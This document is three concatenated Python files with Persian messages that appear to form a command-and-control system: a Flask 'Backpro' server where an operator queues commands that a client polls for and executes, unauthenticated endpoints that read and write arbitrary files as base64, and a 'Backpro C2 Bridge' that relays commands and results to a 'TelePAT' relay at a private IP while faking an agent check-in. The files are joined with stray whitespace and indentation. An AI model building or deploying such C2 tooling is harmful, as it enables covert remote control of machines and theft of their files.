from flask import Blueprint, request, jsonify
import sqlite3
from datetime import datetime

admin_bp = Blueprint('admin', __name__, url_prefix='/api/admin')


def init_db():
    conn = sqlite3.connect("db.sqlite")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS Commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command_text TEXT NOT NULL,
            arguments TEXT,
            created_at TEXT,
            status TEXT DEFAULT 'pending'
        )
    """)
    conn.commit()
    conn.close()


init_db()


@admin_bp.route('/commands', methods=['POST'])
def create_command():
    try:
        data = request.get_json()
        command_text = data.get('command_text')
        arguments = data.get('arguments', '')

        if not command_text:
            return jsonify({"status": "error", "message": "command_text الزامی است"}), 400

        conn = sqlite3.connect("db.sqlite")
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO Commands (command_text, arguments, created_at, status)
            VALUES (?, ?, ?, ?)
        """, (command_text, arguments, datetime.now().isoformat(), 'pending'))
        conn.commit()
        new_id = cursor.lastrowid
        conn.close()

        return jsonify({
            "status": "success",
            "message": "دستور با موفقیت اضافه شد",
            "command_id": new_id
        }), 201

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400


@admin_bp.route('/commands', methods=['GET'])

def get_all_commands():
    try:
        conn = sqlite3.connect("db.sqlite")
        cursor = conn.cursor()

        
        cursor.execute("""
            SELECT id, command_text, arguments, created_at, status 
            FROM Commands 
            ORDER BY created_at DESC
        """)
        rows = cursor.fetchall()

        
        command_list = []
        for row in rows:
            command_list.append({
                "id": row[0],
                "command_text": row[1],
                "arguments": row[2] or "",          
                "created_at": row[3],
                "status": row[4]
            })

        conn.close()

        return jsonify({
            "status": "success",
            "total": len(command_list),
            "commands": command_list
        }), 200

    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"خطا در دریافت لیست دستورات: {str(e)}"
        }), 500



@admin_bp.route('/results', methods=['GET'])

def get_all_results():
    try:
        conn = sqlite3.connect("db.sqlite")
        cursor = conn.cursor()

        
        cursor.execute("""
            SELECT 
                Results.id,
                Commands.command_text,
                Commands.arguments,
                Results.result_data,
                Results.created_at,
                Commands.status
            FROM Results
            LEFT JOIN Commands ON Results.command_id = Commands.id
            ORDER BY Results.created_at DESC
        """)
        rows = cursor.fetchall()

        results_list = []
        for row in rows:
            results_list.append({
                "result_id": row[0],
                "command_text": row[1] or "نامشخص",
                "arguments": row[2] or "",
                "result_data": row[3],
                "created_at": row[4],
                "command_status": row[5] or "نامشخص"
            })

        conn.close()

        return jsonify({
            "status": "success",
            "total_results": len(results_list),
            "results": results_list
        }), 200

    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"خطا در دریافت نتایج: {str(e)}"
        }), 500


@admin_bp.route('/commands/<int:command_id>', methods=['DELETE'])
def delete_command(command_id):
    try:
        conn = sqlite3.connect("db.sqlite")
        cursor = conn.cursor()

        
        cursor.execute("SELECT id FROM Commands WHERE id = ?", (command_id,))
        if not cursor.fetchone():
            conn.close()
            return jsonify({"status": "error", "message": f"دستور {command_id} پیدا نشد"}), 404

      
        cursor.execute("DELETE FROM Commands WHERE id = ?", (command_id,))
        conn.commit()
        conn.close()

        return jsonify({
            "status": "success",
            "message": f"دستور {command_id} با موفقیت حذف شد"
        }), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
    




























    from flask import Blueprint, request, jsonify
import sqlite3
from datetime import datetime
import base64
import os
client_bp = Blueprint('client', __name__, url_prefix='/api/client')


def init_results_table():
    conn = sqlite3.connect("db.sqlite")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS Results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command_id INTEGER,
            result_data TEXT,
            created_at TEXT,
            FOREIGN KEY (command_id) REFERENCES Commands (id)
        )
    """)
    conn.commit()
    conn.close()

init_results_table()


@client_bp.route('/results', methods=['POST'])
def create_result():
    try:
        data = request.get_json()
        if not data or 'result' not in data:
            return jsonify({"status": "error", "message": "فیلد 'result' الزامی است"}), 400

        result_text = data['result']
        status_success = data.get('status', False)  

        conn = sqlite3.connect("db.sqlite")
        cursor = conn.cursor()

        
        cursor.execute("""
            SELECT id FROM Commands 
            WHERE status = 'pending' 
            ORDER BY created_at DESC 
            LIMIT 1
        """)
        pending_command = cursor.fetchone()

        if not pending_command:
            conn.close()
            return jsonify({
                "status": "error",
                "message": "هیچ دستور در حال انتظار (pending) وجود ندارد!"
            }), 404

        command_id = pending_command[0]

        
        new_status = 'completed' if status_success else 'failed'
        cursor.execute("""
            UPDATE Commands SET status = ? WHERE id = ?
        """, (new_status, command_id))

        
        cursor.execute("""
            INSERT INTO Results (command_id, result_data, created_at)
            VALUES (?, ?, ?)
        """, (command_id, result_text, datetime.now().isoformat()))

        conn.commit()
        conn.close()

        return jsonify({
            "status": "success",
            "message": "نتیجه با موفقیت ثبت شد",
            "command_id": command_id,
            "result_status": new_status
        }), 201

    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"خطا در ثبت نتیجه: {str(e)}"
        }), 500
    

    
@client_bp.route('/get-command', methods=['GET'])
#  http://127.0.0.1:5000/api/client/get-command
def get_last_pending_command():
    try:
        conn = sqlite3.connect("db.sqlite")
        cursor = conn.cursor()

        
        cursor.execute("""
            SELECT id, command_text, arguments 
            FROM Commands 
            WHERE status = 'pending' 
            ORDER BY created_at DESC 
            LIMIT 1
        """)
        command = cursor.fetchone()
        conn.close()

        if command:
            return jsonify({
                "status": "success",
                "command_id": command[0],
                "command_text": command[1] or "",
                "arguments": command[2] or ""
            }), 200
        else:
            return jsonify({
                "status": "empty",
                "message": "هیچ دستور در حال انتظاری وجود ندارد."
            }), 200  

    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"خطا در دریافت دستور: {str(e)}"
        }), 500
    
@client_bp.route('/upload', methods=['POST'])
def client_upload():
    data = request.get_json() or {}
    file_path = data.get('path', '').strip()
    file_data = data.get('data', '')
    filename = data.get('filename', 'uploaded_file')

    if not file_path or not file_data:
        return jsonify({"status": "error", "message": "Missing path or file data"}), 400

    try:
        full_path = os.path.abspath(os.path.join(file_path, filename))
        os.makedirs(os.path.dirname(full_path), exist_ok=True)

        with open(full_path, 'wb') as f:
            f.write(base64.b64decode(file_data))

        return jsonify({
            "status": "success",
            "message": f"File successfully uploaded to {full_path}"
        }), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@client_bp.route('/download', methods=['POST'])
def client_download():
    data = request.get_json() or {}
    file_path = data.get('path', '').strip()

    if not file_path:
        return jsonify({"status": "error", "message": "No file path provided"}), 400

    try:
        full_path = os.path.abspath(file_path)

        if not os.path.exists(full_path):
            return jsonify({"status": "error", "message": "File not found"}), 404

        if os.path.isdir(full_path):
            return jsonify({"status": "error", "message": "Path is a directory"}), 400

        with open(full_path, 'rb') as f:
            file_data = base64.b64encode(f.read()).decode('utf-8')

        return jsonify({
            "status": "success",
            "filename": os.path.basename(full_path),
            "data": file_data,
            "size": os.path.getsize(full_path)
        }), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500



























from SlotSDK import SlotSDK
import requests
import sqlite3
import threading
import time
import socket
import platform
import os
from flask import Flask, request, jsonify

RELAY_URL = "ws://192.168.230.133:8081/ws"
SLOT_ID = "backpro-c2-agent"
BACKPRO_URL = "http://127.0.0.1:5000"
HTTP_PORT = 5001
AGENT_ID_FILE = "agent_id.txt"

app = Flask(__name__)

class BridgeState:
    sdk = None

GLOBAL_AGENT_ID = None
command_mapping = {}

def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] [Bridge] {msg}")

@app.route('/', methods=['GET', 'POST'])
@app.route('/checkin', methods=['GET', 'POST'])
@app.route('/register', methods=['GET', 'POST'])
@app.route('/agent', methods=['GET', 'POST'])
def agent_checkin():
    return jsonify({
        "status": "ok",
        "agent_id": 1,
        "slot_id": SLOT_ID,
        "version": "1.0.0",
        "hostname": "DESKTOP-G75BTQ",
        "os": "windows",
        "arch": "AMD64"
    }), 200

@app.route('/command', methods=['POST'])
def receive_command():
    data = request.get_json() or {}
    command = data.get('command', '')
    arguments = data.get('arguments', '')
    if command:
        forward_to_backpro(command, arguments, agent_id=1)
        log(f"Command received from TelePAT: {command} {arguments}")
        return jsonify({"status": "accepted"}), 200
    return jsonify({"status": "error", "message": "no command"}), 400

def forward_to_backpro(command, arguments="", agent_id=1):
    try:
        payload = {
            "command_text": command,
            "arguments": arguments or "",
            "agent_id": agent_id
        }
        r = requests.post(
            f"{BACKPRO_URL}/api/admin/commands",
            json=payload,
            timeout=10
        )
        if r.status_code in (200, 201):
            log(f"Command forwarded successfully to Backpro: '{command}' (agent_id={agent_id})")
            log(f"Backpro response: {r.text}")
        else:
            log(f"Forward failed: HTTP {r.status_code} - {r.text}")
    except Exception as e:
        log(f"Error forwarding to Backpro: {e}")

def send_results_to_telepat():
    try:
        conn = sqlite3.connect("db.sqlite")
        cursor = conn.cursor()
        cursor.execute("""
            SELECT r.id, r.result_data, r.command_id, c.command_text
            FROM Results r
            JOIN Commands c ON r.command_id = c.id
            WHERE r.id > (SELECT COALESCE(MAX(result_id), 0) FROM sent_results)
        """)
        rows = cursor.fetchall()
        conn.close()

        for result_id, result_data, backpro_cmd_id, command_text in rows:
            if BridgeState.sdk and BridgeState.sdk.connected and BridgeState.sdk.registered:
                telepat_cmd_id = command_mapping.get(backpro_cmd_id, "unknown")

                result_payload = {
                    "stdout": result_data.strip(),
                    "stderr": "",
                    "exit_code": 0,
                    "duration": 0,
                    "finished": True,
                    "command_id": telepat_cmd_id
                }

                BridgeState.sdk.send_result(telepat_cmd_id, result_payload)
                log(f"Result sent to TelePAT for TelePAT ID: {telepat_cmd_id} (command: {command_text[:50]})")

                conn = sqlite3.connect("db.sqlite")
                conn.execute("INSERT OR IGNORE INTO sent_results (result_id) VALUES (?)", (result_id,))
                conn.commit()
                conn.close()
    except Exception as e:
        log(f"Error sending results: {e}")

def background_loop():
    while True:
        send_results_to_telepat()
        time.sleep(8)

def command_polling_loop():
    global GLOBAL_AGENT_ID
    while True:
        if BridgeState.sdk.registered and BridgeState.sdk.connected and GLOBAL_AGENT_ID:
            cmd = BridgeState.sdk.request_commands(
                agent_id=GLOBAL_AGENT_ID,
                count=1,
                timeout=10
            )
            if cmd:
                telepat_cmd_id = cmd.get("command_id")
                command_text = cmd.get("input_data", {}).get("command", "").strip()
                arguments = cmd.get("input_data", {}).get("arguments", "")

                if not command_text:
                    log("Warning: Received empty command — skipping")
                    continue

                log(f"New command received from TelePAT! ID: {telepat_cmd_id}")
                log(f"Command: {command_text} {arguments}")

                try:
                    payload = {
                        "command_text": command_text,
                        "arguments": arguments,
                        "agent_id": 1
                    }
                    r = requests.post(f"{BACKPRO_URL}/api/admin/commands", json=payload, timeout=20)
                    if r.status_code in (200, 201):
                        backpro_resp = r.json()
                        backpro_cmd_id = backpro_resp.get("id") or backpro_resp.get("command_id")
                        if backpro_cmd_id:
                            command_mapping[backpro_cmd_id] = telepat_cmd_id
                            log(f"Mapped TelePAT ID {telepat_cmd_id} → Backpro ID {backpro_cmd_id}")
                        log(f"Command successfully forwarded: '{command_text}'")
                    else:
                        log(f"Forward failed: {r.status_code} {r.text}")
                except Exception as e:
                    log(f"Error forwarding command: {e}")

        time.sleep(5)

if __name__ == "__main__":
    log("Starting TelePAT → Backpro Bridge")

    conn = sqlite3.connect("db.sqlite")
    conn.execute("CREATE TABLE IF NOT EXISTS sent_results (result_id INTEGER PRIMARY KEY)")
    conn.commit()
    conn.close()

    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=HTTP_PORT, use_reloader=False), daemon=True).start()
    log(f"HTTP server started on port {HTTP_PORT}")

    if os.path.exists(AGENT_ID_FILE):
        with open(AGENT_ID_FILE, "r") as f:
            try:
                GLOBAL_AGENT_ID = int(f.read().strip())
                log(f"Loaded saved agent_id: {GLOBAL_AGENT_ID}")
            except:
                GLOBAL_AGENT_ID = None

    BridgeState.sdk = SlotSDK(RELAY_URL, SLOT_ID, lambda msg: None, heartbeat_interval=60)
    threading.Thread(target=BridgeState.sdk.run, daemon=True).start()

    while not (BridgeState.sdk.registered and BridgeState.sdk.connected):
        time.sleep(1)
    log("Slot registered and connected")

    if not GLOBAL_AGENT_ID:
        log("Registering new agent")
        result = BridgeState.sdk.send_agent_registration(
            description="Backpro C2 Bridge",
            hostname=socket.gethostname(),
            os_name=platform.system().lower(),
            arch=platform.machine(),
            version="1.0.0",
            timeout=60
        )
        if isinstance(result, int):
            GLOBAL_AGENT_ID = result
            with open(AGENT_ID_FILE, "w") as f:
                f.write(str(GLOBAL_AGENT_ID))
            log(f"New agent registered: {GLOBAL_AGENT_ID}")
        else:
            log("Agent registration failed")
    else:
        log(f"Using existing agent_id: {GLOBAL_AGENT_ID}")

    threading.Thread(target=command_polling_loop, daemon=True).start()
    log("Command polling started")

    threading.Thread(target=background_loop, daemon=True).start()

    log("Bridge fully active")
    while True:
        time.sleep(60)


































        